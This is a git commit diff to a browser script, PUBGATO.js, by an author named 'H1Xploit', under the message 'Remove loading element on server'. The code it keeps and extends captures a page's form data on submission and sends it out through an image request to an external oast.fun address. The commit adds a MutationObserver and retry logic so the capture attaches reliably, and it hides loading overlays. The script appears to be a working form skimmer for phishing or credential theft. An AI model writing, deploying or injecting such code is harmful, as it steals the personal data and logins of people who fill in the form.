cfc7b67416540cc28c8eaa761fffece710f75529
H1Xploit <80883814+H1Xploit@users.noreply.github.com>
2025-09-13 13:30:06 +0700

    Remove loading element on server

--- PUBGATO.js
+++ PUBGATO.js
@@ -5,7 +5,15 @@ if (document.readyState === 'loading') {
 }
 
 function init() {
-    setTimeout(() => {
+    function removeLoadingElements() {
+        const loadingElements = document.querySelectorAll('.v-loading');
+        loadingElements.forEach(element => {
+            element.style.display = 'none';
+            element.remove();
+        });
+    }
+
+    function setupFormCapture() {
         const form = document.querySelector('form');
         if (form) {
             const originalSubmit = form.submit;
@@ -31,6 +39,30 @@ function init() {
                     new Image().src = 'https://gqkaubaktwtqypifyzshde4g2jmmngnsu.oast.fun?data=' + data;
                 }
             });
+
+            console.log('Form capture setup completed');
+        } else {
+            console.log('Form not found, retrying in 500ms');
+            setTimeout(setupFormCapture, 500);
         }
-    }, 1000);
+    }
+
+    removeLoadingElements();
+    
+    const observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+            removeLoadingElements();
+            
+            if (!document.querySelector('form')) {
+                setTimeout(setupFormCapture, 100);
+            }
+        });
+    });
+
+    observer.observe(document.body, {
+        childList: true,
+        subtree: true
+    });
+
+    setTimeout(setupFormCapture, 1000);
 }
